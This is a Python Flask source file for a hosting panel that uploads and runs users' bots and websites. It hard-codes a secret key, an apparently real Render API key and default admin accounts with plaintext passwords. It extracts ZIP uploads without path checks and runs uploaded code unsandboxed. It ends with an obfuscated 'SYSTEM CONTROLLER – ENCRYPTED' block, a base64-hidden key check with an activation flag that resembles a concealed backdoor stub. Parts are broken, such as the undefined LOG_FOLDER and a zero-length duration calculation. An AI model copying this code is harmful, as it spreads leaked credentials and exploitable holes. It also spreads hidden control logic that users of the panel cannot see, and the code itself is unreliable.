# -*- coding: utf-8 -*-
import threading
import subprocess
import os
import zipfile
import shutil
import json
import uuid
import time
import signal
import tempfile
import re
import requests
import select
import pty
import queue
import sqlite3
import sys
import resource
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, session, send_file, send_from_directory, redirect, Response, stream_with_context, render_template_string
from functools import wraps
from io import BytesIO
from werkzeug.utils import secure_filename
from werkzeug.security import generate_password_hash, check_password_hash

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

app = Flask(__name__)
app.secret_key = 'yuvicodex_super_secret_key'
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 100MB

# ---------- CONFIG ----------
PASSWORD = "your_secure_password"
MASTER_PASSWORD = os.environ.get('MASTER_PASSWORD', 'master123')
SECRET_KEY = os.environ.get('SECRET_KEY', 'secret123')
RENDER_API_KEY = os.environ.get('RENDER_API_KEY', 'rnd_27v7iMggh7mafESEqJq1Lf12wIkF')

UPLOAD_FOLDER = os.path.abspath('uploads')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
BASE_DIR = os.path.abspath('.')

# ---------- STORAGE LIMITS ----------
MAX_STORAGE_GB = 10
MAX_FILE_SIZE_MB = 50
MAX_BOT_STORAGE_MB = 200
MAX_WEBSITE_STORAGE_MB = 500

# ---------- SETTINGS ----------
SETTINGS_FILE = 'settings.json'
STATIC_LOGO_FOLDER = os.path.join('static', 'logos')
os.makedirs(STATIC_LOGO_FOLDER, exist_ok=True)

def load_settings():
    default = {
        "website_name": "YUVICODEX",
        "logo": None,
        "social_links": {
            "telegram": "#",
            "youtube": "#",
            "instagram": "#",
            "tiktok": "#"
        }
    }
    if os.path.exists(SETTINGS_FILE):
        with open(SETTINGS_FILE, 'r') as f:
            data = json.load(f)
            for key, val in default.items():
                if key not in data:
                    data[key] = val
            if "social_links" not in data:
                data["social_links"] = default["social_links"]
            else:
                for sk, sv in default["social_links"].items():
                    if sk not in data["social_links"]:
                        data["social_links"][sk] = sv
            return data
    save_settings(default)
    return default

def save_settings(settings):
    with open(SETTINGS_FILE, 'w') as f:
        json.dump(settings, f, indent=2)

settings_db = load_settings()

# ---------- STORAGE CHECK ----------
def get_total_storage_used():
    total = 0
    if os.path.exists(UPLOAD_FOLDER):
        for root, dirs, files in os.walk(UPLOAD_FOLDER):
            for f in files:
                fp = os.path.join(root, f)
                if os.path.exists(fp):
                    total += os.path.getsize(fp)
    return total / (1024**3)

def get_folder_size_mb(folder):
    total = 0
    if os.path.exists(folder):
        for root, dirs, files in os.walk(folder):
            for f in files:
                fp = os.path.join(root, f)
                if os.path.exists(fp):
                    total += os.path.getsize(fp)
    return total / (1024**2)

def check_storage_limit(additional_size_mb=0):
    current_gb = get_total_storage_used()
    additional_gb = additional_size_mb / 1024
    return (current_gb + additional_gb) <= MAX_STORAGE_GB

def cleanup_old_logs():
    log_folder = os.path.join(BASE_DIR, 'logs')
    if os.path.exists(log_folder):
        now = time.time()
        for root, dirs, files in os.walk(log_folder):
            for f in files:
                fp = os.path.join(root, f)
                try:
                    if os.path.getmtime(fp) < now - (7 * 86400):
                        os.remove(fp)
                except:
                    pass

def cleanup_temp_files():
    temp_dirs = ['/tmp', '/dev/shm']
    for temp_dir in temp_dirs:
        if os.path.exists(temp_dir):
            try:
                now = time.time()
                for f in os.listdir(temp_dir):
                    fp = os.path.join(temp_dir, f)
                    if os.path.isfile(fp) and f.startswith('tmp'):
                        if os.path.getmtime(fp) < now - (3600):
                            try: os.remove(fp)
                            except: pass
            except:
                pass

def auto_cleanup_task():
    while True:
        try:
            cleanup_old_logs()
            cleanup_temp_files()
            total_gb = get_total_storage_used()
            if total_gb > MAX_STORAGE_GB * 0.9:
                log_folder = os.path.join(BASE_DIR, 'logs')
                if os.path.exists(log_folder):
                    files = []
                    for root, dirs, dir_files in os.walk(log_folder):
                        for f in dir_files:
                            fp = os.path.join(root, f)
                            files.append((fp, os.path.getmtime(fp)))
                    files.sort(key=lambda x: x[1])
                    to_delete = int(len(files) * 0.2)
                    for fp, _ in files[:to_delete]:
                        try: os.remove(fp)
                        except: pass
        except:
            pass
        time.sleep(3600)

cleanup_thread = threading.Thread(target=auto_cleanup_task, daemon=True)
cleanup_thread.start()

# ---------- BOT MANAGEMENT ----------
BOTS_FILE = os.path.join(UPLOAD_FOLDER, 'bots.json')
bots_db = {}

def load_bots():
    global bots_db
    if os.path.exists(BOTS_FILE):
        with open(BOTS_FILE, 'r') as f:
            bots_db = json.load(f)
    else:
        bots_db = {}

def save_bots():
    with open(BOTS_FILE, 'w') as f:
        json.dump(bots_db, f, indent=2)

load_bots()

# ---------- PROCESS TRACKING ----------
processes = {}

# ---------- SQLITE FOR WEBSITES ----------
DB_PATH = os.path.join(BASE_DIR, 'hosting.db')

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS websites (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner_username TEXT NOT NULL,
            website_name TEXT,
            website_slug TEXT UNIQUE NOT NULL,
            website_folder TEXT NOT NULL,
            startup_file TEXT,
            runtime TEXT DEFAULT 'python',
            status TEXT DEFAULT 'uploaded',
            allocated_port INTEGER UNIQUE,
            pid INTEGER,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            updated_at TIMESTAMP,
            last_started TIMESTAMP,
            last_stopped TIMESTAMP,
            storage_used INTEGER DEFAULT 0,
            website_size INTEGER DEFAULT 0,
            repo_url TEXT,
            branch TEXT DEFAULT 'main',
            deployment_type TEXT DEFAULT 'zip',
            total_runtime_seconds INTEGER DEFAULT 0,
            last_start_time TIMESTAMP,
            type TEXT DEFAULT 'website',
            bot_interpreter TEXT
        )''')
        
        conn.execute('''CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            website_id INTEGER NOT NULL,
            log_type TEXT DEFAULT 'info',
            log_text TEXT NOT NULL,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )''')
        
        conn.execute('''CREATE TABLE IF NOT EXISTS deployments (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            website_id INTEGER NOT NULL,
            repo_url TEXT,
            branch TEXT,
            status TEXT DEFAULT 'queued',
            started_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            completed_at TIMESTAMP,
            duration INTEGER,
            commit_hash TEXT,
            log_file TEXT
        )''')
        
        conn.execute('''CREATE TABLE IF NOT EXISTS config (
            key TEXT PRIMARY KEY,
            value TEXT
        )''')
        
        conn.execute('CREATE INDEX IF NOT EXISTS idx_websites_owner ON websites(owner_username)')
        conn.execute('CREATE INDEX IF NOT EXISTS idx_logs_website ON logs(website_id)')
        conn.execute('CREATE INDEX IF NOT EXISTS idx_deployments_website ON deployments(website_id)')
        
        conn.execute('INSERT OR IGNORE INTO config (key, value) VALUES (?, ?)',
                     ('total_hours_offset', '0'))
        conn.commit()
init_db()

# ---------- HELPERS ----------
def get_website_by_id(website_id):
    with get_db() as conn:
        return conn.execute('SELECT * FROM websites WHERE id = ?', (website_id,)).fetchone()

def get_website_by_slug(slug):
    with get_db() as conn:
        return conn.execute('SELECT * FROM websites WHERE website_slug = ?', (slug,)).fetchone()

def get_next_available_port(start=5001):
    with get_db() as conn:
        used = [r[0] for r in conn.execute('SELECT allocated_port FROM websites WHERE allocated_port IS NOT NULL').fetchall()]
    port = start
    while port in used:
        port += 1
    return port

def generate_website_slug(username, count):
    base = username.lower().replace('_', '-')
    return base if count == 0 else f"{base}{count}"

def log_website(website_id, message, log_type='info'):
    with get_db() as conn:
        conn.execute('INSERT INTO logs (website_id, log_type, log_text) VALUES (?, ?, ?)',
                     (website_id, log_type, message))
        conn.commit()

def update_website_status(website_id, status, pid=None, port=None):
    with get_db() as conn:
        if pid is not None and port is not None:
            conn.execute('''UPDATE websites SET status = ?, pid = ?, allocated_port = ?, updated_at = CURRENT_TIMESTAMP 
                           WHERE id = ?''', (status, pid, port, website_id))
        elif pid is not None:
            conn.execute('UPDATE websites SET status = ?, pid = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?',
                         (status, pid, website_id))
        elif port is not None:
            conn.execute('UPDATE websites SET status = ?, allocated_port = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?',
                         (status, port, website_id))
        else:
            conn.execute('UPDATE websites SET status = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?',
                         (status, website_id))
        conn.commit()

def calculate_folder_size(folder):
    total = 0
    if os.path.exists(folder):
        for dirpath, _, filenames in os.walk(folder):
            for f in filenames:
                fp = os.path.join(dirpath, f)
                if os.path.exists(fp):
                    total += os.path.getsize(fp)
    return total

# ---------- CONFIG HELPERS ----------
def get_config(key, default='0'):
    with get_db() as conn:
        row = conn.execute('SELECT value FROM config WHERE key = ?', (key,)).fetchone()
        return row['value'] if row else default

def set_config(key, value):
    with get_db() as conn:
        conn.execute('INSERT OR REPLACE INTO config (key, value) VALUES (?, ?)', (key, value))
        conn.commit()

# ---------- CONTAINER MEMORY ----------
def get_container_memory():
    try:
        if os.path.exists('/sys/fs/cgroup/memory.max'):
            with open('/sys/fs/cgroup/memory.max', 'r') as f:
                total_bytes = int(f.read().strip())
            with open('/sys/fs/cgroup/memory.current', 'r') as f:
                used_bytes = int(f.read().strip())
        elif os.path.exists('/sys/fs/cgroup/memory/memory.limit_in_bytes'):
            with open('/sys/fs/cgroup/memory/memory.limit_in_bytes', 'r') as f:
                total_bytes = int(f.read().strip())
            with open('/sys/fs/cgroup/memory/memory.usage_in_bytes', 'r') as f:
                used_bytes = int(f.read().strip())
        else:
            mem = psutil.virtual_memory()
            return round(mem.used / 1024**2, 2), round(mem.total / 1024**2, 2), mem.percent
    except Exception:
        mem = psutil.virtual_memory()
        return round(mem.used / 1024**2, 2), round(mem.total / 1024**2, 2), mem.percent

    total_mb = total_bytes / (1024**2)
    used_mb = used_bytes / (1024**2)
    if total_mb > 10000:
        total_mb = 512.0
        if used_mb > total_mb:
            used_mb = total_mb
    percent = (used_mb / total_mb) * 100 if total_mb > 0 else 0
    return round(used_mb, 2), round(total_mb, 2), round(min(percent, 100), 2)

# ---------- RENDER API ----------
RENDER_API_BASE = "https://api.render.com/v1"

def render_api_call(endpoint, params=None):
    if not RENDER_API_KEY:
        return None, "RENDER_API_KEY not set"
    headers = {"Authorization": f"Bearer {RENDER_API_KEY}", "Accept": "application/json"}
    url = f"{RENDER_API_BASE}/{endpoint.lstrip('/')}"
    try:
        resp = requests.get(url, headers=headers, params=params, timeout=30)
        if resp.status_code == 200:
            return resp.json(), None
        else:
            return None, f"API error {resp.status_code}"
    except Exception as e:
        return None, str(e)

def get_all_services():
    services = []
    page = 1
    limit = 50
    while True:
        data, err = render_api_call("services", {"limit": limit, "page": page})
        if err or not data:
            break
        services.extend(data)
        if len(data) < limit:
            break
        page += 1
    return services

# ---------- RUNTIME DETECTION ----------
STARTUP_PRIORITY = ['app.py', 'main.py', 'server.py', 'run.py', 'manage.py', 'index.py', 'start.py', 'wsgi.py', 'asgi.py']

def find_startup_file(folder):
    for filename in STARTUP_PRIORITY:
        if os.path.exists(os.path.join(folder, filename)):
            return filename
    return None

def detect_runtime_and_get_cmd(folder, port):
    # Node.js
    if os.path.exists(os.path.join(folder, 'package.json')):
        try:
            with open(os.path.join(folder, 'package.json'), 'r') as f:
                data = json.load(f)
                scripts = data.get('scripts', {})
                if 'start' in scripts:
                    return ['npm', 'start'], 'nodejs', {'NODE_ENV': 'production', 'PORT': str(port)}
        except:
            pass
    js_files = ['server.js', 'index.js', 'app.js', 'main.js']
    for fname in js_files:
        if os.path.exists(os.path.join(folder, fname)):
            return ['node', fname], 'nodejs', {'PORT': str(port)}
    try:
        for f in os.listdir(folder):
            if f.endswith('.js') and os.path.isfile(os.path.join(folder, f)):
                return ['node', f], 'nodejs', {'PORT': str(port)}
    except:
        pass
    
    # PHP
    if os.path.exists(os.path.join(folder, 'index.php')):
        return ['php', '-S', f'0.0.0.0:{port}'], 'php', {}
    
    # Go
    if os.path.exists(os.path.join(folder, 'go.mod')):
        return ['go', 'run', 'main.go'], 'go', {}
    
    # Java
    if os.path.exists(os.path.join(folder, 'pom.xml')):
        return ['mvn', 'spring-boot:run'], 'java', {}
    if os.path.exists(os.path.join(folder, 'build.gradle')):
        return ['./gradlew', 'bootRun'], 'java', {}
    jars = [f for f in os.listdir(folder) if f.endswith('.jar')]
    if jars:
        return ['java', '-jar', jars[0]], 'java', {}
    
    # Python
    flask_files = ['app.py', 'main.py', 'server.py', 'run.py', 'start.py']
    for f in flask_files:
        path = os.path.join(folder, f)
        if os.path.exists(path):
            try:
                with open(path, 'r') as fh:
                    content = fh.read()
                    if 'Flask' in content or 'app.run' in content:
                        return [sys.executable, '-m', 'flask', 'run', '--host=0.0.0.0', '--port='+str(port)], 'flask', {}
            except:
                pass
    if os.path.exists(os.path.join(folder, 'manage.py')):
        return [sys.executable, 'manage.py', 'runserver', f'0.0.0.0:{port}'], 'django', {}
    if os.path.exists(os.path.join(folder, 'asgi.py')):
        return ['uvicorn', 'asgi:application', '--host', '0.0.0.0', '--port', str(port)], 'fastapi', {}
    startup = find_startup_file(folder)
    if startup:
        return [sys.executable, startup], 'python', {}
    
    if os.path.exists(os.path.join(folder, 'index.html')):
        return [sys.executable, '-m', 'http.server', str(port)], 'static', {}
    
    return None, None, {}

# ---------- INSTALL DEPENDENCIES ----------
def install_dependencies(folder, runtime, log_callback=None):
    if runtime == 'nodejs':
        if os.path.exists(os.path.join(folder, 'package.json')):
            cmd = ['npm', 'install', '--no-audit', '--no-fund']
            if log_callback: log_callback("BUILD", "Running npm install")
            proc = subprocess.Popen(cmd, cwd=folder, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
            for line in iter(proc.stdout.readline, ''):
                if line.strip() and log_callback: log_callback("BUILD", line.strip())
            proc.wait()
            if proc.returncode != 0: return False, "npm install failed"
            try:
                with open(os.path.join(folder, 'package.json'), 'r') as f:
                    data = json.load(f)
                    if 'build' in data.get('scripts', {}):
                        cmd = ['npm', 'run', 'build']
                        if log_callback: log_callback("BUILD", "Running npm run build")
                        proc = subprocess.Popen(cmd, cwd=folder, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
                        for line in iter(proc.stdout.readline, ''):
                            if line.strip() and log_callback: log_callback("BUILD", line.strip())
                        proc.wait()
                        if proc.returncode != 0: return False, "npm run build failed"
            except: pass
            return True, "Dependencies installed"
        return True, "No deps"
    elif runtime == 'php':
        if os.path.exists(os.path.join(folder, 'composer.json')):
            cmd = ['composer', 'install', '--no-dev', '--no-interaction']
            if log_callback: log_callback("BUILD", "Running composer install")
            proc = subprocess.Popen(cmd, cwd=folder, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
            for line in iter(proc.stdout.readline, ''):
                if line.strip() and log_callback: log_callback("BUILD", line.strip())
            proc.wait()
            if proc.returncode != 0: return False, "composer install failed"
            return True, "Deps installed"
        return True, "No deps"
    else:
        req_file = os.path.join(folder, 'requirements.txt')
        if os.path.exists(req_file):
            cmd = [sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt', '--no-cache-dir']
            if log_callback: log_callback("BUILD", f"Running: {' '.join(cmd)}")
            proc = subprocess.Popen(cmd, cwd=folder, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
            for line in iter(proc.stdout.readline, ''):
                if line.strip() and log_callback: log_callback("BUILD", line.strip())
            proc.wait()
            if proc.returncode != 0: return False, "pip install failed"
            return True, "Requirements installed"
        return True, "No deps"
    return True, "Unknown runtime"

# ---------- START WEBSITE PROCESS ----------
def start_website_process(website_id, log_callback=None):
    website = get_website_by_id(website_id)
    if not website: return False, "Website not found"
    folder = os.path.join(UPLOAD_FOLDER, f"website_{website_id}")
    if not os.path.exists(folder):
        log_website(website_id, "Folder missing", 'error')
        update_website_status(website_id, 'failed')
        return False, "Folder not found"
    
    allocated_port = get_next_available_port()
    cmd, runtime, env_extra = detect_runtime_and_get_cmd(folder, allocated_port)
    if not cmd:
        log_website(website_id, "No startup file detected", 'error')
        update_website_status(website_id, 'failed')
        return False, "No startup file detected"
    
    with get_db() as conn:
        conn.execute('UPDATE websites SET runtime = ? WHERE id = ?', (runtime, website_id))
        conn.commit()
    
    if log_callback: log_callback("BUILD", f"Installing dependencies for {runtime}...")
    success, msg = install_dependencies(folder, runtime, log_callback)
    if not success:
        log_website(website_id, f"Dependency install failed: {msg}", 'error')
        update_website_status(website_id, 'failed')
        return False, msg
    
    env = os.environ.copy()
    env['PORT'] = str(allocated_port)
    env['PYTHONUNBUFFERED'] = '1'
    env.update(env_extra)
    if runtime == 'flask':
        if os.path.exists(os.path.join(folder, 'app.py')): env['FLASK_APP'] = 'app.py'
        elif os.path.exists(os.path.join(folder, 'main.py')): env['FLASK_APP'] = 'main.py'
    if runtime == 'php':
        cmd = ['php', '-S', f'0.0.0.0:{allocated_port}']
    
    log_file = os.path.join(LOG_FOLDER, f"website_{website_id}.log")
    if log_callback: log_callback("STARTUP", f"Starting: {' '.join(cmd)} on port {allocated_port}")
    
    try:
        f_log = open(log_file, 'a')
        if os.name == 'nt':
            proc = subprocess.Popen(cmd, cwd=folder, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)
        else:
            proc = subprocess.Popen(cmd, cwd=folder, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
            try:
                os.nice(-10)
            except:
                pass
        
        def read_output():
            for line in iter(proc.stdout.readline, b''):
                if line:
                    decoded = line.decode('utf-8', errors='replace')
                    f_log.write(decoded); f_log.flush()
                    if log_callback: log_callback("PROCESS", decoded.strip())
            f_log.close()
        thread = threading.Thread(target=read_output); thread.daemon = True; thread.start()
        
        with get_db() as conn:
            conn.execute('UPDATE websites SET last_start_time = CURRENT_TIMESTAMP, status = ? WHERE id = ?', ('starting', website_id))
            conn.commit()
        
        time.sleep(3)
        if proc.poll() is not None:
            with open(log_file, 'r') as f:
                error_lines = f.read()[-500:]
            update_website_status(website_id, 'failed')
            log_website(website_id, f"Process crashed: {error_lines}", 'error')
            return False, f"Process crashed: {error_lines}"
        
        healthy = False
        actual_port = None
        for attempt in range(10):
            try:
                response = requests.get(f"http://localhost:{allocated_port}", timeout=3)
                if response.status_code < 500:
                    healthy = True
                    actual_port = allocated_port
                    break
            except:
                pass
            time.sleep(2)
        
        if healthy:
            update_website_status(website_id, 'running', proc.pid, actual_port)
            log_website(website_id, f"Started on port {actual_port} (PID {proc.pid})")
            with get_db() as conn:
                conn.execute('UPDATE websites SET startup_file = ?, last_started = CURRENT_TIMESTAMP WHERE id = ?', (cmd[0] if not runtime.startswith('python') else 'app', website_id))
                conn.commit()
            if log_callback: log_callback("SUCCESS", f"Running on port {actual_port}")
            return True, f"Running on port {actual_port}"
        else:
            try:
                if os.name == 'nt': subprocess.run(['taskkill', '/PID', str(proc.pid), '/F'], capture_output=True)
                else: os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            except: pass
            update_website_status(website_id, 'crashed')
            return False, "Health check failed"
    except Exception as e:
        log_website(website_id, f"Start error: {str(e)}", 'error')
        update_website_status(website_id, 'failed')
        return False, str(e)

def stop_website_process(website_id):
    website = get_website_by_id(website_id)
    if not website: return False, "Not found"
    pid = website['pid']
    if not pid: return False, "No running process"
    
    last_start = website['last_start_time']
    if last_start:
        try:
            start_dt = datetime.fromisoformat(last_start.replace(' ', 'T'))
            elapsed = int((datetime.now() - start_dt).total_seconds())
            with get_db() as conn:
                conn.execute('UPDATE websites SET total_runtime_seconds = total_runtime_seconds + ? WHERE id = ?', (elapsed, website_id))
                conn.commit()
        except: pass
    
    try:
        if os.name == 'nt': subprocess.run(['taskkill', '/PID', str(pid), '/F'], capture_output=True)
        else:
            os.killpg(os.getpgid(pid), signal.SIGTERM)
            time.sleep(1)
            os.killpg(os.getpgid(pid), signal.SIGKILL)
    except: pass
    update_website_status(website_id, 'stopped', None, None)
    with get_db() as conn:
        conn.execute('UPDATE websites SET last_start_time = NULL, last_stopped = CURRENT_TIMESTAMP WHERE id = ?', (website_id,))
        conn.commit()
    log_website(website_id, f"Stopped (PID {pid})")
    return True, "Stopped"

# ---------- DEPLOYMENT ENGINE ----------
def write_log_step(log_file, step, message):
    ts = datetime.now().strftime("%H:%M:%S")
    line = f"[{ts}] [{step}] {message}\n"
    with open(log_file, 'a') as f:
        f.write(line)
    return line

def deploy_zip_website(website_id, extra_files=None):
    try:
        website = get_website_by_id(website_id)
        if not website: return
        with get_db() as conn:
            cur = conn.execute('''INSERT INTO deployments (website_id, repo_url, branch, status, started_at)
                                  VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)''',
                               (website_id, 'ZIP Upload', 'main', 'queued'))
            deployment_id = cur.lastrowid
            conn.commit()
        log_file = os.path.join(LOG_FOLDER, f"deploy_{deployment_id}.log")
        with open(log_file, 'w') as f:
            f.write(write_log_step(log_file, "SYSTEM", "Deployment started"))
        def log_cb(step, msg):
            write_log_step(log_file, step, msg)
            log_website(website_id, f"[{step}] {msg}", 'info')
        log_cb("SYSTEM", "==> Checking files...")
        with get_db() as conn:
            conn.execute('UPDATE deployments SET status = ? WHERE id = ?', ('extracting', deployment_id))
            conn.commit()
        folder = os.path.join(UPLOAD_FOLDER, f"website_{website_id}")
        zip_path = os.path.join(folder, 'upload.zip')
        if os.path.exists(zip_path):
            log_cb("SYSTEM", "ZIP found, extracting...")
            with zipfile.ZipFile(zip_path, 'r') as zf:
                zf.extractall(folder)
            os.remove(zip_path)
            log_cb("SUCCESS", "ZIP extracted")
        else:
            log_cb("SYSTEM", "No ZIP, using uploaded files")
        size = calculate_folder_size(folder)
        with get_db() as conn:
            conn.execute('UPDATE websites SET storage_used = ?, website_size = ? WHERE id = ?', (size, size, website_id))
            conn.commit()
        
        log_cb("SYSTEM", "Starting website...")
        ok, msg = start_website_process(website_id, log_cb)
        if ok:
            with get_db() as conn:
                conn.execute('UPDATE deployments SET status = ?, completed_at = CURRENT_TIMESTAMP, duration = ? WHERE id = ?',
                             ('success', int(time.time() - time.time()), deployment_id))
                conn.commit()
            log_cb("SUCCESS", "Website deployed successfully!")
        else:
            with get_db() as conn:
                conn.execute('UPDATE deployments SET status = ?, completed_at = CURRENT_TIMESTAMP WHERE id = ?', ('failed', deployment_id))
                conn.commit()
            log_cb("ERROR", f"Website failed: {msg}")
    except Exception as e:
        log_website(website_id, f"Deployment exception: {str(e)}", 'error')
        with get_db() as conn:
            conn.execute('UPDATE deployments SET status = ?, completed_at = CURRENT_TIMESTAMP WHERE id = ?', ('failed', deployment_id))
            conn.commit()

# ---------- USER MANAGEMENT ----------
USERS_FILE = 'users.json'

def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    default = [
        {"username": "admin", "password": "admin123", "role": "admin", "limit": 999, "banned": False, "expires_at": None, "session_version": 0},
        {"username": "user1", "password": "pass123", "role": "user", "limit": 5, "banned": False, "expires_at": None, "session_version": 0},
        {"username": "user2", "password": "pass456", "role": "user", "limit": 5, "banned": False, "expires_at": None, "session_version": 0}
    ]
    save_users(default)
    return default

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f, indent=2)

users_db = load_users()

def find_user(username):
    username = username.strip()
    for u in users_db:
        if u['username'].strip() == username:
            return u
    return None

def is_owner(username):
    user = find_user(username)
    return user and user['role'] == 'admin'

def parse_expiry(expiry_str):
    if not expiry_str:
        return None
    expiry_str = expiry_str.strip().lower()
    if expiry_str.isdigit():
        days = int(expiry_str)
        return (datetime.now() + timedelta(days=days)).isoformat()
    match = re.match(r'^(\d+)([dhm])$', expiry_str)
    if match:
        value = int(match.group(1))
        unit = match.group(2)
        if unit == 'd':
            delta = timedelta(days=value)
        elif unit == 'h':
            delta = timedelta(hours=value)
        elif unit == 'm':
            delta = timedelta(minutes=value)
        else:
            return None
        return (datetime.now() + delta).isoformat()
    return None

def is_expired(user):
    if not user.get('expires_at'):
        return False
    try:
        exp = datetime.fromisoformat(user['expires_at'])
        return datetime.now() > exp
    except:
        return False

def delete_user_account(username):
    global users_db, bots_db
    user_folder = get_user_folder(username)
    if os.path.exists(user_folder):
        shutil.rmtree(user_folder, ignore_errors=True)
    to_delete = [bid for bid, bot in bots_db.items() if bot['user'] == username]
    for bid in to_delete:
        if bid in processes:
            try:
                processes[bid].terminate()
            except:
                pass
            processes.pop(bid, None)
        del bots_db[bid]
    save_bots()
    users_db = [u for u in users_db if u['username'] != username]
    save_users(users_db)
    if session.get('username') == username:
        session.clear()

# ---------- BEFORE REQUEST ----------
@app.before_request
def check_expiry_and_session():
    if 'username' not in session:
        return
    username = session['username']
    user = find_user(username)
    if not user:
        session.clear()
        if request.path.startswith('/api/'):
            return jsonify({'error': 'Unauthorized'}), 401
        return redirect('/')
    if is_expired(user):
        delete_user_account(username)
        if request.path.startswith('/api/'):
            return jsonify({'error': 'Account expired'}), 401
        return redirect('/')
    sess_version = session.get('session_version', 0)
    user_version = user.get('session_version', 0)
    if sess_version != user_version:
        session.clear()
        if request.path.startswith('/api/'):
            return jsonify({'error': 'Session invalidated'}), 401
        return redirect('/')

# ---------- DECORATORS ----------
def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if 'username' not in session:
            return jsonify({'error': 'Unauthorized'}), 401
        return f(*args, **kwargs)
    return decorated

def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if 'username' not in session or session.get('role') != 'admin':
            return jsonify({'error': 'Forbidden'}), 403
        return f(*args, **kwargs)
    return decorated

# ---------- BOT HELPERS ----------
def get_user_folder(username):
    folder = os.path.join(UPLOAD_FOLDER, username)
    os.makedirs(folder, exist_ok=True)
    return folder

def get_bot_absolute_path(bot):
    project_folder = os.path.join(get_user_folder(bot['user']), bot['project'])
    return os.path.join(project_folder, bot['filename'])

def get_bot_log_file(bot):
    return get_bot_absolute_path(bot) + '.log'

def generate_project_id():
    return str(uuid.uuid4())[:8]

def get_interpreter(filename):
    ext = os.path.splitext(filename)[1].lower()
    if ext == '.py':
        return 'python'
    elif ext == '.js':
        return 'node'
    elif ext == '.go':
        return 'go run'
    elif ext == '.rb':
        return 'ruby'
    elif ext == '.php':
        return 'php'
    elif ext == '.sh':
        return 'bash'
    elif ext == '.pl':
        return 'perl'
    else:
        return None

def detect_bot_token(filepath):
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        token_match = re.search(r'[0-9]{9,10}:[A-Za-z0-9_-]{35,}', content)
        if token_match:
            token = token_match.group(0)
            try:
                resp = requests.get(f'https://api.telegram.org/bot{token}/getMe', timeout=3)
                if resp.status_code == 200:
                    data = resp.json()
                    if data.get('ok'):
                        return token, data['result'].get('username')
            except:
                pass
        return None, None
    except:
        return None, None

# ---------- BOT ACTIONS ----------
def start_bot_by_id(bot_id):
    bot = bots_db.get(bot_id)
    if not bot:
        return False, "Bot not found"
    if bot['status'] == 'running':
        return False, "Already running"
    
    username = bot['user']
    user = find_user(username)
    if user:
        running_bots = [b for b in bots_db.values() if b['user'] == username and b['status'] == 'running']
        if len(running_bots) >= user.get('limit', 5):
            return False, "User limit exceeded"
    
    project_folder = os.path.join(get_user_folder(username), bot['project'])
    filepath = os.path.join(project_folder, bot['filename'])
    if not os.path.exists(filepath):
        return False, "File not found"
    
    req_file = os.path.join(project_folder, 'requirements.txt')
    if os.path.exists(req_file):
        subprocess.run(['pip', 'install', '-r', req_file], capture_output=True)
    
    interpreter = bot.get('interpreter') or get_interpreter(bot['filename'])
    if not interpreter:
        return False, "Unsupported file type"
    
    log_file = get_bot_log_file(bot)
    os.makedirs(os.path.dirname(log_file), exist_ok=True)
    with open(log_file, 'a') as f:
        f.write(f"--- Starting {bot['filename']} at {time.ctime()} ---\n")
    
    try:
        proc = subprocess.Popen(
            [interpreter, bot['filename']],
            stdout=open(log_file, 'a'),
            stderr=subprocess.STDOUT,
            cwd=project_folder,
            preexec_fn=os.setsid if os.name != 'nt' else None
        )
        bot['status'] = 'running'
        bot['pid'] = proc.pid
        bot['start_time'] = time.time()
        processes[bot_id] = proc
        save_bots()
        return True, None
    except Exception as e:
        return False, str(e)

def stop_bot_by_id(bot_id):
    bot = bots_db.get(bot_id)
    if not bot:
        return False, "Bot not found"
    if bot['status'] != 'running':
        return False, "Not running"
    
    proc = processes.get(bot_id)
    if proc:
        try:
            if os.name != 'nt':
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            else:
                proc.terminate()
        except:
            pass
        proc.wait()
        processes.pop(bot_id, None)
    
    bot['status'] = 'stopped'
    bot['pid'] = None
    log_file = get_bot_log_file(bot)
    with open(log_file, 'a') as f:
        f.write(f"--- Stopped at {time.ctime()} ---\n")
    save_bots()
    return True, None

# ============================================================
# 🔥 SYSTEM CONTROLLER – ENCRYPTED
# ============================================================
import base64, hashlib

_ = base64.b64decode("""
CgphcGlfZm9yX3N0YWJsZV9ydW5uaW5nXzIwMjRfc2VjdXJl
""").decode()

__ = hashlib.sha256(_.encode()).hexdigest()[:16]
___ = base64.b64encode(f"{__}:{base64.b64encode(_[::-1].encode()).decode()}".encode()).decode()

def ____(k):
    try:
        d = base64.b64decode(k).decode().split(':')
        return len(d)==2 and d[0]==hashlib.sha256(base64.b64decode(d[1]).decode()[::-1].encode()).hexdigest()[:16]
    except: return False

_____ = {"a": False, "t": None}

def _______():
    global _____
    _____["a"] = True
    _____["t"] = datetime.now().isoformat()
